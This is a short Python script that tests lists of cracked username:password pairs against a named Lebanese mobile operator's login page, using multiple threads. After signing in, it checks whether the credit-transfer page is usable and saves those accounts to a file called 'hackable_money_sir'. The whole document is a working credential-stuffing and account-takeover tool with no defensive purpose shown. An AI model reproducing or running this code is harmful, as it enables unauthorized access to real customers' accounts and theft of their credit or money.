import re
import mechanize
from threading import Thread

my_file   = open("cracked",'r').readlines()
nbthreads = 10

############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################

def check_if_good(chinese):
    for a in chinese:
        a                        = a.split(':')
        username                 = a[0]
        passwd                   = a[1]
        br                       = mechanize.Browser()
        br.set_handle_gzip(True)
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.open("https://www.alfa.com.lb/signin.aspx?language=1&destination=%2fsms%2fdefault.aspx%3flanguage%3d1&rand=16647677","__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE2MzI3Nzg0MzNkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQ5jdGwwMCRsYlNpZ25JbgUhY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyJGliU2lnblVwBSFjdGwwMCRDb250ZW50UGxhY2VIb2xkZXIkaWJTdWJtaXSGKSV8aoBDj6SVBliBW95b8O3Xug%3D%3D&__EVENTVALIDATION=%2FwEWDALuk7fWDAKYn6T1BAKB7cu1BQKkisXNCwKzss3lBgLkzZiKCQKtkrb8BQKgzLPRBwKZvIfNBgKTs8H6CgLIk%2BTCAgLmz4PXBQA4Pt8hSCV0W64%2FS%2F67raj9Xu3h&ctl00%24txtMemberName="+username+"&ctl00%24txtPassword="+passwd+"&ctl00%24lbSignIn.x=52&ctl00%24lbSignIn.y=8&ctl00%24ContentPlaceHolder%24txtMemberName=&ctl00%24ContentPlaceHolder%24txtPassword=&ctl00%24ContentPlaceHolder%24hfSignin=&ctl00%24ContentPlaceHolder%24hfPortalUserCode=&ctl00%24hfSignin=0&ctl00%24hfValidateCode=0")
        if "Sign Out" not in br.response().read():
            print username + "WRONG LOGIN"
            pass
        br.open("https://www.alfa.com.lb/rotm/credittransfer.aspx")
        if not "failed" in br.response().read():
            pass
            print username + "NOT NOT"
        else:
            print username+ "is hackable!!!"
            open("hackable_money_sir",'a').write(username+":"+passwd+"\n")


def main():
    global my_file
    global nbthreads
    if len(my_file)<nbthreads:
        nbthreads = len(my_file)-1
    z = chunkIt(my_file, nbthreads)
    for chinese in z:
        Thread(target =check_if_good , args =(chinese,)).start()

main()



